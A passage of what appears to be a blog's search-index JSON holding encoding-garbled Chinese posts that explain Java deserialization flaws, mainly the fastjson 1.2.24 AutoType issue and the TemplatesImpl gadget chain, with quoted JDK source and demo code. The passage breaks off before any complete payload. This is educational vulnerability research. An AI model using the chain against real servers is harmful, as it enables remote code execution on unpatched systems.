çš„åœ°å€ã€‚\nå¯åŠ¨ LDAP æœåŠ¡å’Œ Http æœåŠ¡åï¼Œæ‰§è¡Œæµ‹è¯•ä»£ç ä¹Ÿå¯ä»¥å®Œæˆåˆ©ç”¨ã€‚\nä½†å¥½æ™¯ä¸é•¿ï¼ŒOracle å®˜æ–¹åœ¨ Java SEï¼š6u201ã€7u191ã€8u182 ä¹Ÿä¿®å¤äº†è¿™ä¸ªé—®é¢˜ã€‚\næ³¨ æ–‡ä¸­æµ‹è¯•ä½¿ç”¨ç³»ç»Ÿå’Œå·¥å…·ç‰ˆæœ¬å¦‚ä¸‹ï¼š\næ“ä½œç³»ç»Ÿ windows 10 20H2 jdk java 1.8.0_41-b04 fastjson 1.2.24 javassist 3.28.0-GA unboundid-ldapsdk 6.0.2 ä»£ç ä»“åº“ https://github.com/dushixiang/java-serialization-vulnerability å…¶ä»– æŒ–æ˜æ¼æ´æ˜¯ä¸€ä¸ªä½ æ¥æˆ‘å¾€çš„è¿‡ç¨‹ï¼Œä¸€ä¸ªæ¼æ´å‡ºç°ä¹‹åå¿…ç„¶ä¼šä¼´éšç€åç»­ç‰ˆæœ¬çš„ä¿®å¤ï¼Œé™¤äº†é‚£ç§å·²ç»ä¸å†æ›´æ–°çš„ç±»åº“ï¼Œå› æ­¤åœ¨é€‰æ‹©æ¡†æ¶æˆ–ç±»åº“æ—¶å®Œå–„åº¦å’Œæ´»è·ƒåº¦éƒ½æ˜¯é‡è¦çš„åº¦é‡æ ‡å‡†ã€‚\nfastjson åœ¨åç»­çš„ç‰ˆæœ¬ä¸­ä¹Ÿå¾ˆå¿«ä¿®å¤äº†è¿™äº›æ¼æ´ï¼Œä½†å®‰å…¨äººå‘˜åˆä¸æ–­æŒ–æ˜æ–°çš„åˆ©ç”¨æ–¹å¼ï¼Œåœ¨ä¸‹ä¸€ç¯‡æˆ‘ä»¬ä¹Ÿä¼šä»‹ç»åœ¨ fastjson å‡ ä¸ªé‡è¦ç‰ˆæœ¬çš„æ›´æ–°å†…å®¹å’Œæ–°çš„åˆ©ç”¨æ–¹å¼ï¼Œä»¥åŠåœ¨é«˜ç‰ˆæœ¬çš„JDKä¸­å¦‚ä½•åˆ©ç”¨ã€‚\n","permalink":"https://www.typesafe.cn/posts/java-serialization-vulnerability-4/","summary":"\u003ch2 id=\"å£°æ˜\"\u003eå£°æ˜\u003c/h2\u003e\n\u003cp\u003eæœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\u003c/p\u003e\n\u003ch2 id=\"jndi-æ˜¯ä»€ä¹ˆ\"\u003eJNDI æ˜¯ä»€ä¹ˆ\u003c/h2\u003e\n\u003cp\u003eJavaå‘½åå’Œç›®å½•æ¥å£ï¼ˆJava Naming and Directory Interfaceï¼Œç¼©å†™JNDIï¼‰ï¼Œæ˜¯Javaçš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºæ¥å£ï¼ˆAPIï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚\u003c/p\u003e\n\u003cp\u003eJNDI åŒ…å«åœ¨Java SEä¸­ï¼Œä¸éœ€è¦å¼•ç”¨ç¬¬ä¸‰æ–¹jarå³å¯ä½¿ç”¨ã€‚è¦ä½¿ç”¨ JNDI å¿…é¡»è¦æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡æä¾›è€…ã€‚JDK æœ¬èº«å·²ç»åŒ…æ‹¬äº†ä¸‹é¢å‡ ç§æœåŠ¡æä¾›è€…ã€‚\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eè½»é‡çº§ç›®å½•è®¿é—®åè®® (LDAP)\u003c/li\u003e\n\u003cli\u003eCORBA å…¬å…±å¯¹è±¡æœåŠ¡å‘½åï¼ˆCOS namingï¼‰\u003c/li\u003e\n\u003cli\u003eJava è¿œç¨‹æ–¹æ³•è°ƒç”¨ (RMI)\u003c/li\u003e\n\u003cli\u003eåŸŸåæœåŠ¡ (DNS)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eè¿™ä¹ˆè¯´èµ·æ¥è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼Œç®€å•ç†è§£å°±æ˜¯\u003cstrong\u003eæœåŠ¡æä¾›è€…\u003c/strong\u003eæä¾›ä¸€ä¸ªç±»ä¼¼Key Valueçš„æ•°æ®ï¼Œ\u003cstrong\u003eJNDI\u003c/strong\u003eå¯ä»¥é€šè¿‡è¿™ä¸ª Key è·å–åˆ°\u003cstrong\u003eæœåŠ¡æä¾›è€…\u003c/strong\u003eä¸Šçš„æä¾›çš„Valueï¼Œå› æ­¤JNDIæ˜¯æ— æ³•å•ç‹¬ä½¿ç”¨çš„ã€‚\u003c/p\u003e\n\u003cp\u003eä½¿ç”¨JNDIçš„æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œä¸‹é¢å°±æ˜¯ä¸€ä¸ªè·å–è¿œç¨‹å¯¹è±¡çš„ç¤ºä¾‹ä»£ç ã€‚\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e// åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡\nInitialContext context = new InitialContext();\n// æŸ¥æ‰¾ç›‘å¬åœ¨æœ¬åœ° 1099 ç«¯å£ä¸Š RMI æœåŠ¡çš„ Object å¯¹è±¡\nObject obj = context.lookup(\u0026#34;rmi://localhost:1099/Object\u0026#34;);\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"rmi-æ˜¯ä»€ä¹ˆ\"\u003eRMI æ˜¯ä»€ä¹ˆ\u003c/h2\u003e\n\u003cp\u003eRMI æ˜¯ Remote Method Invocation çš„ç¼©å†™ï¼Œä¸­æ–‡å«ä¹‰ä¸ºè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³ä¸€ä¸ªJavaç¨‹åºè°ƒç”¨è°ƒç”¨å¦ä¸€ä¸ªJavaç¨‹åºæš´éœ²å‡ºæ¥çš„æ–¹æ³•ã€‚\u003c/p\u003e\n\u003cp\u003eRMI æœ‰ä¸‰ä¸ªæ¦‚å¿µï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eRegistry :\u003c/strong\u003e æä¾›æœåŠ¡æ³¨å†Œå’ŒæœåŠ¡è·å–ï¼ŒæœåŠ¡ç«¯å°†ç±»åç§°ï¼Œå­˜æ”¾åœ°å€æ³¨å†Œåˆ°Registryä¸­ï¼Œä»¥ä¾›å®¢æˆ·ç«¯è·å–ã€‚\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eServer :\u003c/strong\u003e è¿œç¨‹æ–¹æ³•çš„æä¾›è€…ã€‚\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eClient :\u003c/strong\u003e è¿œç¨‹æ–¹æ³•çš„è°ƒç”¨è€…ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eè¿œç¨‹æ–¹æ³•çš„å®šä¹‰éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eå®ç° \u003ccode\u003ejava.rmi.Remote\u003c/code\u003eã€‚\u003c/li\u003e\n\u003cli\u003eç»§æ‰¿ \u003ccode\u003ejava.rmi.server.UnicastRemoteObject\u003c/code\u003eã€‚\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"rmi-ä½¿ç”¨ç¤ºä¾‹\"\u003eRMI ä½¿ç”¨ç¤ºä¾‹\u003c/h2\u003e\n\u003ch3 id=\"registry\"\u003eRegistry\u003c/h3\u003e\n\u003cp\u003eåˆ›å»º Registry\u003c/p\u003e","title":"Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆå››ï¼‰JNDI + RMI/LDAP åœ¨fastjsonä¸­çš„åˆ©ç”¨åŸç†"},{"content":"å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\nFastjson æ˜¯ä»€ä¹ˆ fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚\nfastjsonç›¸å¯¹å…¶ä»–JSONåº“çš„ç‰¹ç‚¹æ˜¯å¿«ã€‚fastjsonåœ¨é˜¿é‡Œå·´å·´å¤§è§„æ¨¡ä½¿ç”¨ï¼Œåœ¨æ•°ä¸‡å°æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œfastjsonåœ¨ä¸šç•Œè¢«å¹¿æ³›æ¥å—ã€‚åœ¨2012å¹´è¢«å¼€æºä¸­å›½è¯„é€‰ä¸ºæœ€å—æ¬¢è¿çš„å›½äº§å¼€æºè½¯ä»¶ä¹‹ä¸€ã€‚\nä»¥ä¸Šæ‘˜è‡ªFastjson GitHub ä»‹ç»ã€‚\nä½†è¿‘å¹´æ¥éšç€ Fastjson ä¸æ–­çˆ†å‡ºæ¼æ´ï¼Œå„å¤§ä¸­å°å‹å…¬å¸éƒ½é€æ¸å¼ƒç”¨ Fastjson ï¼Œç”šè‡³é˜¿é‡Œè‡ªå·±å¼€æºçš„æœåŠ¡æ³¨å†Œã€é…ç½®ç®¡ç†å¹³å° NACOS åœ¨ 1.3.0 ç‰ˆæœ¬ä¹‹åéƒ½ä» Fastjson æ›¿æ¢ä¸ºäº† Jackson (è¯¦è§ https://github.com/alibaba/nacos/releases/tag/1.3.0) ï¼Œå¯è§æ¼æ´å±å®³ä¹‹å¤§ã€‚\nä¸ºä»€ä¹ˆä¼šå¼ƒç”¨ Fastjson ï¼Ÿ æƒ³è¦ç ”ç©¶ä¸€ä¸ªäº§å“çš„æ¼æ´å…¶ä¸­æœ‰ä¸€æ¡å¾ˆå¥½çš„é€”å¾„å°±æ˜¯å»æŸ¥è¯¢ CVE ç¼–å·ï¼Œä½†æ˜¯æˆ‘åœ¨æ£€ç´¢ä¹‹åå‘ç° Fastjson åªæœ‰ CVE-2017-18349 è¿™ä¸€æ¡ï¼Œè€Œ Jackson ç«Ÿç„¶æœ‰é«˜è¾¾ 76 æ¡ã€‚\nè¿™èƒ½å¦è¯æ˜ Fastjson æ¯” Jackson æ›´å®‰å…¨å‘¢ï¼Ÿç­”æ¡ˆå¹¶ä¸æ˜¯ï¼Œéƒ½æ˜¯åŠæ–¤å…«ä¸¤ï¼Œæœ‰äº› Fastjson é‡Œé¢å‡ºç°çš„æ¼æ´åœ¨ Jackson é‡Œé¢ä¹ŸåŒæ ·å­˜åœ¨ã€‚\né‚£ä¸ºä»€ä¹ˆä¼šæœ‰å…¬å¸å¼ƒç”¨ Fastjson å‘¢ï¼Ÿ\næˆ–è®¸æ˜¯ Jackson æœ‰æ›´å®Œå–„ä¸”å…¬å¼€çš„æ¼æ´ç®¡ç†æœºåˆ¶ï¼Œæˆ–è®¸æ˜¯å›½å¤–çš„æœˆäº®æ¯”è¾ƒåœ†ï¼Œæˆ–è®¸æ˜¯éšå¤§æµï¼Œä¹Ÿæˆ–è®¸æ˜¯ Fastjson ä»£ç è´¨é‡ä¸è¿‡å…³ï¼ˆçŸ¥ä¹ä¸Šæœ‰å¾ˆå¤šå›ç­”æ‰¹åˆ¤ Fastjson ä»£ç ç³Ÿç³•çš„ï¼‰ï¼ŒçœŸå®åŸå› å°±ä¸å¾—è€ŒçŸ¥äº†ã€‚\nå°½ç®¡è¿‘å¹´æ¥æœ‰å…¬å¸ä¸æ–­å¼ƒç”¨ Fastjson ï¼Œä½†è¿˜æœ‰å¾ˆå¤šå…¬å¸åœ¨ä½¿ç”¨ï¼Œå¹¶ä¸”å·²ç»å¼€å‘ä¸Šçº¿çš„ç³»ç»Ÿæƒ³è¦æ›¿æ¢æˆ–è€…å‡çº§ Fastjson è¿˜éœ€è¦æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆæœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹ Fastjson æ¼æ´çš„äº§å› ã€‚\nFastjson æ¼æ´äº§ç”ŸåŸå›  Fastjson ç¬¬ä¸€æ¬¡è¢«çˆ†å‡ºæœ‰æ¼æ´æ˜¯å®˜æ–¹åœ¨2017å¹´3æœˆ15æ—¥ä¸»åŠ¨æŠ«éœ²çš„ï¼Œè¯¦è§ https://github.com/alibaba/fastjson/wiki/security_update_20170315 ã€‚æ¼æ´å½±å“ 1.2.24 ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬ã€‚æˆ‘ä»¬ä»Šå¤©æ¥ç ”ç©¶ä¸€ä¸‹å½“ fastjson version \u0026lt;= 1.2.24 æ—¶æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ã€‚\næˆ‘ä»¬å…ˆåœ¨ pom.xml ä¸­å¢åŠ  fastjson 1.2.24 çš„ä¾èµ–ã€‚\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ä¸‹é¢å…ˆçœ‹ä¸€ä¸ªæœ€å¸¸è§çš„åºåˆ—åŒ–ä¸ºJSONå’Œååºåˆ—åŒ–ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ã€‚\né¦–å…ˆå®šä¹‰ä¸€ä¸ªå¸¸è§çš„ Java å¯¹è±¡ã€‚\npublic class User { private String name; private Integer age; public String getName() { System.out.println(\u0026#34;call getName\u0026#34;); return name; } public void setName(String name) { System.out.println(\u0026#34;call setName\u0026#34;); this.name = name; } public Integer getAge() { System.out.println(\u0026#34;call getAge\u0026#34;); return age; } public void setAge(Integer age) { System.out.println(\u0026#34;call setAge\u0026#34;); this.age = age; } @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } ç¼–å†™ä¸€ä¸ªæµ‹è¯•ç±»\nimport com.alibaba.fastjson.JSON; public class Eval0 { public static void main(String[] args) { User user = new User(); user.setName(\u0026#34;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#34;); user.setAge(26); String jsonString = JSON.toJSONString(user); System.out.println(\u0026#34;åºåˆ—åŒ–å: \u0026#34; + jsonString); System.out.println(\u0026#34;ååºåˆ—åŒ–å¼€å§‹\u0026#34;); System.out.println(\u0026#34;ååºåˆ—åŒ–: \u0026#34; + JSON.parseObject(jsonString, User.class)); System.out.println(\u0026#34;ååºåˆ—åŒ–ç»“æŸ\u0026#34;); } } ä»£ç å¾ˆç®€å•ï¼Œè¿è¡Œåä¼šè¾“å‡ºï¼š\ncall setName call setAge call getAge call getName åºåˆ—åŒ–å: {\u0026#34;age\u0026#34;:26,\u0026#34;name\u0026#34;:\u0026#34;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#34;} ååºåˆ—åŒ–å¼€å§‹ call setAge call setName ååºåˆ—åŒ–: User{name=\u0026#39;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#39;, age=26} ååºåˆ—åŒ–ç»“æŸ å¯ä»¥çœ‹åˆ° Fastjson åœ¨å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º Java å¯¹è±¡çš„æ—¶å€™è°ƒç”¨äº† setæ–¹æ³•ï¼Œçœ‹è¿‡ã€ŠJava ååºåˆ—åŒ–æ¼æ´åŸç†ã€‹å‰ä¸¤ç¯‡æ–‡ç« çš„åŒå­¦å¯èƒ½ä¼šæ€è€ƒï¼Œæˆ‘ä»¬èƒ½å¦æ„å»ºä¸€æ¡åˆ©ç”¨é“¾ï¼Œè®© Fastjson åœ¨æ‰§è¡Œ set æ–¹æ³•çš„æ—¶å€™èƒ½å¤Ÿæ‰§è¡Œæˆ‘ä»¬æŒ‡å®šçš„å‘½ä»¤ã€‚\næˆ‘ä»¬å…ˆå‡è®¾è¿™ä¸ªæ–¹å¼æˆç«‹ï¼Œä½†ç›®å‰å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ï¼š\nå¦‚ä½•è®© Fastjson å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºæˆ‘ä»¬æŒ‡å®šçš„å¯¹è±¡ï¼Ÿ å“ªä¸€ä¸ªå¯¹è±¡å¯ä»¥åœ¨ set çš„æ—¶å€™æ‰§è¡Œæˆ‘ä»¬æŒ‡å®šçš„å‘½ä»¤å‘¢ï¼Ÿ ç¬¬ä¸€ä¸ªé—®é¢˜æŸ¥çœ‹ Fastjson æ–‡æ¡£åå¯ä»¥å¾—åˆ°ç­”æ¡ˆï¼Œå½“ JSON å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ª key ä¸º @type æ—¶ï¼Œä¼šå°† JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º @type å¯¹åº” value ä¸­æŒ‡å®šçš„ Java ç±»ï¼Œè¿™å°±æ˜¯ Fastjson çš„ AutoType åŠŸèƒ½ã€‚å¹¶ä¸” Fastjson åœ¨ååºåˆ—åŒ–å¸¦æœ‰ @type çš„ JSON å­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šJavaå¯¹è±¡çš„ç±»å‹ï¼Œè¿˜ä¼šè°ƒç”¨å…¶æˆå‘˜å˜é‡çš„ get æ–¹æ³•ã€‚\næˆ‘ä»¬ç¨å¾®æ”¹åŠ¨ä¸€ä¸‹æµ‹è¯•ç±»ï¼Œåœ¨åºåˆ—åŒ–ä¸ºJSONæ—¶å°†ç±»å‹ä¹Ÿå†™è¿›å»ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°†ç±»å‹å»é™¤ï¼š\nimport com.alibaba.fastjson.JSON; import com.alibaba.fastjson.serializer.SerializerFeature; public class Eval1 { public static void main(String[] args) { User user = new User(); user.setName(\u0026#34;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#34;); user.setAge(26); String jsonString = JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(\u0026#34;åºåˆ—åŒ–å: \u0026#34; + jsonString); System.out.println(\u0026#34;ååºåˆ—åŒ–å¼€å§‹\u0026#34;); System.out.println(\u0026#34;ååºåˆ—åŒ–: \u0026#34; + JSON.parseObject(jsonString)); System.out.println(\u0026#34;ååºåˆ—åŒ–ç»“æŸ\u0026#34;); } } æ‰§è¡Œåä¼šè¾“å‡ºï¼š\ncall setName call setAge call getAge call getName åºåˆ—åŒ–å: {\u0026#34;@type\u0026#34;:\u0026#34;cn.typesafe.jsv.fastjson.User\u0026#34;,\u0026#34;age\u0026#34;:26,\u0026#34;name\u0026#34;:\u0026#34;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#34;} ååºåˆ—åŒ–å¼€å§‹ call setAge call setName call getAge call getName ååºåˆ—åŒ–: {\u0026#34;name\u0026#34;:\u0026#34;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#34;,\u0026#34;age\u0026#34;:26} ååºåˆ—åŒ–ç»“æŸ å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯è°ƒç”¨äº† Java å¯¹è±¡çš„ get æ–¹æ³•ï¼Œæ‰€ä»¥å¦‚æœ get æ–¹æ³•èƒ½å¤Ÿè§¦å‘ä»£ç æ‰§è¡Œä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\nTemplatesImpl çš„åˆ©ç”¨é“¾ æ‰©å¤§æ¡ä»¶åï¼Œç¬¬äºŒä¸ªé—®é¢˜ç ”ç©¶å®‰å…¨çš„å‰è¾ˆä¹Ÿå·²ç»å¸®æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªåˆé€‚çš„ Java å¯¹è±¡ com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplã€‚\nå®ƒçš„æˆå‘˜å˜é‡å¦‚ä¸‹ï¼š\npublic final class TemplatesImpl implements Templates, Serializable { static final long serialVersionUID = 673094361519270707L; public final static String DESERIALIZE_TRANSLET = \u0026#34;jdk.xml.enableTemplatesImplDeserialization\u0026#34;; // çˆ¶æŠ½è±¡ç±»çš„å®Œæ•´åŒ…åç§° private static String ABSTRACT_TRANSLET = \u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; // ä¸é‡è¦ï¼Œåªè¦ä¸ä¸ºç©ºå°±è¡Œ private String _name = null; // å­˜æ”¾å­—èŠ‚æ•°ç»„çš„æ•°ç»„ private byte[][] _bytecodes = null; // Class æ•°ç»„ private Class[] _class = null; // translet å­ç±»åœ¨ _class ä¸­çš„ä¸‹æ ‡ private int _transletIndex = -1; // å­˜æ”¾ class çš„å®¹å™¨ï¼Œå¯ä»¥å¿½ç•¥ private Hashtable _auxClasses = null; // æ­¤å­—æ®µä¸èƒ½ä¸º nullï¼Œå› ä¸ºè¦è®© Fastjson è°ƒç”¨ getOutputProperties æ–¹æ³• private Properties _outputProperties; // å…¶ä»–æˆå‘˜å˜é‡å¯ä»¥å¿½ç•¥ } æˆ‘ä»¬é¦–å…ˆå°±æ¥çœ‹ _outputProperties å¯¹åº”çš„ getOutputProperties æ–¹æ³•ï¼š\npublic synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); } catch (TransformerConfigurationException e) { return null; } } ä»£ç å¾ˆç®€å•ï¼Œé‡è¦çš„æ˜¯ newTransformer() æ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ï¼š\npublic synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } å…¶ä¸­ getTransletInstance() ä»£ç å¦‚ä¸‹ï¼š\nprivate Translet getTransletInstance() throws TransformerConfigurationException { try { // _name ä¸èƒ½ä¸º nullï¼Œä¸ç„¶å°±ç›´æ¥è¿”å›äº† if (_name == null) return null; // _class ä¸èƒ½èµ‹å€¼ï¼Œè¦è¿›å…¥ defineTransletClasses æ‰èƒ½å°†æˆ‘ä»¬å‡†å¤‡çš„ Class åŠ è½½è¿›æ¥ if (_class == null) defineTransletClasses(); // ä»åŠ è½½æˆåŠŸçš„Classä¸­æ‰¾åˆ° AbstractTranslet çš„å­ç±»ä½¿ç”¨åå°„åˆ›å»ºå¯¹è±¡ï¼ŒnewInstance() ä¼šè°ƒç”¨é»˜è®¤çš„æ— å‚æ„é€ æ–¹æ³•ï¼Œå› æ­¤åªè¦åœ¨æ„é€ æ–¹æ³•ä¸­æ·»åŠ æˆ‘ä»¬éœ€è¦çš„ä»£ç å°±èƒ½åšåˆ°ä»»æ„ä»£ç æ‰§è¡Œ AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); // ä¸‹é¢çš„ä»£ç ä¸é‡è¦äº† translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } catch (InstantiationException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (IllegalAccessException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } defineTransletClasses() æ–¹æ³•ä»£ç å¦‚ä¸‹ï¼š\nprivate void defineTransletClasses() throws TransformerConfigurationException { // _bytecodes ä¸èƒ½ä¸º null if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } // è·å–ç±»åŠ è½½å™¨ TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader()); } }); try { // è·å–äºŒç»´æ•°ç»„çš„é•¿åº¦ï¼Œä¸€ä¸ªå­—èŠ‚æ•°ç»„å¯¹åº”ä¸€ä¸ª Class final int classCount = _bytecodes.length; _class = new Class[classCount]; // åˆ¤æ–­ Class æ•°é‡é•¿åº¦å¤§äº1å°±åˆå§‹åŒ–ä¸€ä¸ªå®¹å™¨ç”¨äºå­˜æ”¾ Classï¼Œå¯¹æˆ‘ä»¬æ¥è¯´æ²¡å•¥ç”¨ï¼Œå¯ä»¥å¿½ç•¥ if (classCount \u0026gt; 1) { _auxClasses = new Hashtable(); } for (int i = 0; i \u0026lt; classCount; i++) { // ä½¿ç”¨ç±»åŠ è½½å™¨å°†å­—èŠ‚æ•°ç»„åŠ è½½ä¸º Class _class[i] = loader.defineClass(_bytecodes[i]); // è·å–å…¶çˆ¶ç±» Class final Class superClass = _class[i].getSuperclass(); // åˆ¤æ–­å½“å‰ Class çš„çˆ¶ç±» Class åç§°æ˜¯å¦ä¸º com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet if (superClass.getName().equals(ABSTRACT_TRANSLET)) { // èµ‹å€¼ translet Class åœ¨æ•°ç»„ä¸­çš„ä¸‹æ ‡ _transletIndex = i; } else { // å­˜å‚¨ Class åç§°åŠ Classï¼Œå¯¹æˆ‘ä»¬æ¥è¯´æ²¡å•¥ç”¨ï¼Œå¯ä»¥å¿½ç•¥ _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } åˆ°ç›®å‰ä¸ºæ­¢ï¼ŒåŸºæœ¬çš„åˆ©ç”¨é“¾æˆ‘ä»¬å·²ç»ææ¸…æ¥šäº†ï¼Œå…ˆè®© Fastjson åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°† TemplatesImpl çš„å‡ ä¸ªå…³é”®æˆå‘˜å˜é‡èµ‹å€¼ï¼Œå¦‚å°† _bytecodes å­—æ®µèµ‹å€¼ä¸ºæˆ‘ä»¬äº‹å…ˆå‡†å¤‡å¥½çš„å­—èŠ‚æ•°ç»„ï¼Œè¿™æ ·åœ¨ Fastjson è°ƒç”¨ getTransletInstance çš„æ—¶å€™ä¼šæ¥ç€è°ƒç”¨ defineTransletClasses æ–¹æ³•å°†å­—èŠ‚æ•°ç»„ä½¿ç”¨ç±»åŠ è½½å™¨åŠ è½½å¯¹ Classï¼Œå®Œæˆä¹‹åä¼šå†æ‰¾åˆ° class æ•°ç»„ _class ä¸­ AbstractTranslet çš„å­ç±» Class ä½¿ç”¨åå°„è°ƒç”¨æ— å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼Œè€Œè¿™ä¸ªå¯¹è±¡æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œåœ¨å…¶æ„é€ æ–¹æ³•ä¸­æ·»åŠ ä»»æ„ä»£ç å®Œæˆåˆ©ç”¨ã€‚\nä½†æ˜¯è¿˜æœ‰ä¸‰ä¸ªé—®é¢˜ï¼š\nå¦‚ä½•å°† Java Class æ–‡ä»¶è½¬æ¢ä¸ºå­—èŠ‚ï¼Ÿ å¦‚ä½•å°† Java Class å­—èŠ‚åºåˆ—åŒ–ä¸º Fastjson å¯ä»¥è¯†åˆ«çš„ JSON å†…å®¹ï¼Ÿ com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ä¸­æˆ‘ä»¬éœ€è¦æ“ä½œçš„é‚£å‡ ä¸ªæˆå‘˜å˜é‡éƒ½æ˜¯ä»¥ä¸‹åˆ’çº¿ä¸ºå¼€å¤´çš„ï¼Œå¹¶ä¸”åªæœ‰ get æ–¹æ³•æ²¡æœ‰ set æ–¹æ³•ï¼ŒFastjson è¦å¦‚ä½•è¿›è¡Œååºåˆ—åŒ–ï¼Ÿ ç¬¬ä¸€ä¸ªé—®é¢˜æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ IO æµå°† Java Class 